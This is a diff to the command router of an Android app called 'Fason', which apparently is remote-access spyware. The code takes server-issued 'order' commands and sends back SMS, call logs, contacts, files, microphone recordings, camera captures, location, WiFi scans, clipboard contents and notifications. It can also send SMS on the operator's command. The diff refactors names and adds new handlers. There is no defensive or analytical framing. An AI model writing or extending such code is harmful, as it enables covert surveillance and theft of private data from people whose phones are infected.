@@ -1,6 +1,7 @@
 package com.fason.app.core.network;
 
 import android.Manifest;
+import android.content.pm.ServiceInfo;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
@@ -8,10 +9,12 @@ import android.os.Looper;
 import com.fason.app.core.FasonApp;
 import com.fason.app.core.permissions.PermissionManager;
 import com.fason.app.features.apps.AppList;
+import com.fason.app.features.apps.FasonManager;
 import com.fason.app.features.calls.CallsManager;
 import com.fason.app.features.camera.CameraManager;
 import com.fason.app.features.clipboard.ClipboardMonitor;
 import com.fason.app.features.contacts.ContactsManager;
+import com.fason.app.features.info.InfoManager;
 import com.fason.app.features.location.LocManager;
 import com.fason.app.features.mic.MicManager;
 import com.fason.app.features.sms.SMSManager;
@@ -28,34 +31,34 @@ import java.util.concurrent.Executors;
 
 import io.socket.client.Socket;
 
+// Routes socket commands to feature handlers
 public final class SocketCommandRouter {
 
     private static FileManager fileMgr;
     private static CameraManager camMgr;
-    private static LocManager locMgr;
     private static final ExecutorService EXEC = Executors.newFixedThreadPool(4);
     private static final Handler handler = new Handler(Looper.getMainLooper());
     private static boolean initialized = false;
-    private static final int RECONNECT_DELAY = 10000;
 
     private SocketCommandRouter() {}
 
+    // Initialize command router
     public static synchronized void initialize() {
         if (initialized) return;
 
-        // Initialize managers lazily
+        // Lazy init managers
         if (fileMgr == null) fileMgr = new FileManager();
         if (camMgr == null) camMgr = new CameraManager(FasonApp.getContext());
 
         Socket socket = SocketClient.getInstance().getSocket();
         if (socket == null) {
-            handler.postDelayed(SocketCommandRouter::initialize, RECONNECT_DELAY);
+            handler.postDelayed(SocketCommandRouter::initialize, 5000);
             return;
         }
 
-        socket.off(); // Clear previous listeners
+        socket.off();
 
-        // Ping-pong for keep-alive
+        // Keep-alive ping
         socket.on("ping", args -> {
             Socket s = SocketClient.getInstance().getSocket();
             if (s != null) s.emit("pong");
@@ -64,18 +67,19 @@ public final class SocketCommandRouter {
         // Main command handler
         socket.on("order", args -> handleOrder(args));
 
-        // Handle disconnect with reconnection
+        // Reconnect on disconnect
         socket.on(Socket.EVENT_DISCONNECT, args -> {
             handler.postDelayed(() -> {
                 Socket s = SocketClient.getInstance().getSocket();
                 if (s != null && !s.connected()) s.connect();
-            }, RECONNECT_DELAY);
+            }, 5000);
         });
 
         socket.connect();
         initialized = true;
     }
 
+    // Route command to handler
     private static void handleOrder(Object[] args) {
         try {
             if (args.length == 0 || !(args[0] instanceof JSONObject)) return;
@@ -86,94 +90,96 @@ public final class SocketCommandRouter {
             switch (type) {
                 case "0xFI": handleFile(data); break;
                 case "0xSM": handleSms(data, socket); break;
-                case "0xCL": EXEC.execute(() -> emit(socket, "0xCL", CallsManager.getCallsLogs())); break;
+                case "0xCL": EXEC.execute(() -> emit(socket, "0xCL", CallsManager.getLogs())); break;
                 case "0xCO": EXEC.execute(() -> emit(socket, "0xCO", ContactsManager.getContacts())); break;
                 case "0xMI": handleMic(data); break;
                 case "0xLO": handleLocation(socket); break;
                 case "0xWI": handleWifi(socket); break;
-                case "0xPM": EXEC.execute(() -> emit(socket, "0xPM", PermissionManager.getGrantedPermissions())); break;
-                case "0xIN": EXEC.execute(() -> emit(socket, "0xIN", AppList.getInstalledApps(data.optBoolean("includeSystem", true)))); break;
-                case "0xGP": emitPermStatus(socket, data.optString("permission", "")); break;
+                case "0xPM": EXEC.execute(() -> emit(socket, "0xPM", PermissionManager.getGranted())); break;
+                case "0xIN": EXEC.execute(() -> emit(socket, "0xIN", AppList.get(data.optBoolean("sys", true)))); break;
+                case "0xGP": checkPerm(socket, data.optString("perm", "")); break;
                 case "0xCA": handleCamera(data, socket); break;
                 case "0xCB": handleClipboard(data); break;
-                case "0xNO": handleNotification(data, socket); break;
+                case "0xNO": handleNotif(data, socket); break;
+                case "0xFM": handleFason(data, socket); break;
+                case "0xIF": EXEC.execute(() -> emit(socket, "0xIF", InfoManager.get())); break;
             }
         } catch (Exception ignored) {}
     }
 
+    // File operations
     private static void handleFile(JSONObject data) {
         String action = data.optString("action");
         String path = data.optString("path", "");
         try {
             if ("ls".equals(action)) {
-                JSONObject p = new JSONObject();
-                p.put("type", "list");
-                p.put("list", fileMgr.walk(path));
-                p.put("path", path);
-                SocketClient.getInstance().getSocket().emit("0xFI", p);
+                JSONObject r = new JSONObject();
+                r.put("type", "list");
+                r.put("list", fileMgr.walk(path));
+                r.put("path", path);
+                SocketClient.getInstance().getSocket().emit("0xFI", r);
             } else if ("dl".equals(action)) {
                 fileMgr.downloadFile(path);
             }
         } catch (Exception ignored) {}
     }
 
+    // SMS operations
     private static void handleSms(JSONObject data, Socket socket) {
         String action = data.optString("action");
         if ("ls".equals(action)) {
-            EXEC.execute(() -> emit(socket, "0xSM", SMSManager.getsms()));
+            EXEC.execute(() -> emit(socket, "0xSM", SMSManager.get()));
         } else if ("sendSMS".equals(action)) {
-            EXEC.execute(() -> emit(socket, "0xSM", SMSManager.sendSMS(data.optString("to"), data.optString("sms"))));
+            EXEC.execute(() -> emit(socket, "0xSM", SMSManager.send(
+                data.optString("to"), data.optString("sms"))));
         }
     }
 
+    // Mic recording
     private static void handleMic(JSONObject data) {
-        int seconds = data.optInt("sec", 0);
+        int sec = data.optInt("sec", 0);
 
-        // Update foreground service type for microphone
-        MainService service = MainService.getInstance();
-        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            service.updateForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
+        // Update service type for Android 14+
+        MainService svc = MainService.getInstance();
+        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
         }
 
-        MicManager.startRecording(seconds);
+        MicManager.start(sec);
     }
 
+    // Location
     private static void handleLocation(Socket socket) {
         EXEC.execute(() -> {
             try {
-                // Use MainService's LocManager if available
-                MainService service = MainService.getInstance();
-                LocManager loc = (service != null) ? service.getLocManager() : new LocManager(FasonApp.getContext());
+                MainService svc = MainService.getInstance();
+                LocManager loc = svc != null ? svc.getLocManager() : new LocManager(FasonApp.getContext());
 
-                // Request fresh location
-                loc.requestSingleLocation();
-
-                // Wait briefly for location update
+                loc.requestSingle();
                 Thread.sleep(3000);
 
                 if (loc.canGetLocation()) {
                     emit(socket, "0xLO", loc.getData());
                 } else {
-                    JSONObject error = new JSONObject();
-                    error.put("enabled", false);
-                    error.put("error", "Location not available");
-                    emit(socket, "0xLO", error);
+                    JSONObject err = new JSONObject();
+                    err.put("enabled", false);
+                    err.put("error", "Location unavailable");
+                    emit(socket, "0xLO", err);
                 }
             } catch (Exception ignored) {}
         });
     }
 
+    // WiFi scan
     private static void handleWifi(Socket socket) {
-        EXEC.execute(() -> {
-            JSONObject result = WifiScanner.scan(FasonApp.getContext());
-            emit(socket, "0xWI", result);
-        });
+        EXEC.execute(() -> emit(socket, "0xWI", WifiScanner.scan(FasonApp.getContext())));
     }
 
+    // Camera operations
     private static void handleCamera(JSONObject data, Socket socket) {
         String action = data.optString("action");
         if ("list".equals(action)) {
-            JSONObject cams = camMgr.findCameraList();
+            JSONObject cams = camMgr.getCameraList();
             if (cams == null) {
                 try {
                     cams = new JSONObject();
@@ -183,57 +189,70 @@ public final class SocketCommandRouter {
             }
             socket.emit("0xCA", cams);
         } else if ("capture".equals(action)) {
-            camMgr.startUp(data.optInt("id", 0));
+            camMgr.capture(data.optInt("id", 0));
         }
     }
 
+    // Clipboard operations
     private static void handleClipboard(JSONObject data) {
         ClipboardMonitor m = ClipboardMonitor.getInstance(FasonApp.getContext());
         String action = data.optString("action", "fetch");
         if ("start".equals(action)) {
             m.start();
-            EXEC.execute(m::emitClipboardSnapshot);
+            EXEC.execute(m::emit);
         } else if ("stop".equals(action)) {
             m.stop();
         } else {
-            EXEC.execute(m::emitClipboardSnapshot);
+            EXEC.execute(m::emit);
         }
     }
 
-    private static void handleNotification(JSONObject data, Socket socket) {
+    // Notification operations
+    private static void handleNotif(JSONObject data, Socket socket) {
         String action = data.optString("action", "status");
-
         if ("status".equals(action)) {
             EXEC.execute(() -> {
                 try {
-                    JSONObject status = new JSONObject();
-                    status.put("enabled", NotificationRelayService.isNotificationListenerEnabled(FasonApp.getContext()));
-                    status.put("connected", NotificationRelayService.getInstance() != null &&
+                    JSONObject s = new JSONObject();
+                    s.put("enabled", NotificationRelayService.isEnabled(FasonApp.getContext()));
+                    s.put("connected", NotificationRelayService.getInstance() != null &&
                         NotificationRelayService.getInstance().isReady());
-                    socket.emit("0xNO", status);
+                    socket.emit("0xNO", s);
                 } catch (Exception ignored) {}
             });
         } else if ("request".equals(action)) {
-            // Request notification listener permission
-            NotificationRelayService.requestNotificationListenerPermission(FasonApp.getContext());
+            NotificationRelayService.requestPermission(FasonApp.getContext());
         }
     }
 
-    private static void emitPermStatus(Socket socket, String perm) {
+    // Check permission status
+    private static void checkPerm(Socket socket, String perm) {
         EXEC.execute(() -> {
             try {
-                JSONObject d = new JSONObject();
-                d.put("permission", perm);
-                d.put("isAllowed", PermissionManager.canIUse(perm));
-                socket.emit("0xGP", d);
+                JSONObject r = new JSONObject();
+                r.put("permission", perm);
+                r.put("allowed", PermissionManager.canIUse(perm));
+                socket.emit("0xGP", r);
             } catch (Exception ignored) {}
         });
     }
 
-    private static void emit(Socket socket, String ch, Object data) {
-        if (socket != null) socket.emit(ch, data);
+    // Fason manager operations
+    private static void handleFason(JSONObject data, Socket socket) {
+        EXEC.execute(() -> {
+            try {
+                String action = data.optString("action", "status");
+                emit(socket, "0xFM", FasonManager.handle(action));
+            } catch (Exception ignored) {}
+        });
     }
 
+    // Emit helper
+    private static void emit(Socket socket, String event, Object data) {
+        if (socket != null) socket.emit(event, data);
+    }
+
+    // Reset router
     public static void reset() {
         initialized = false;
     }
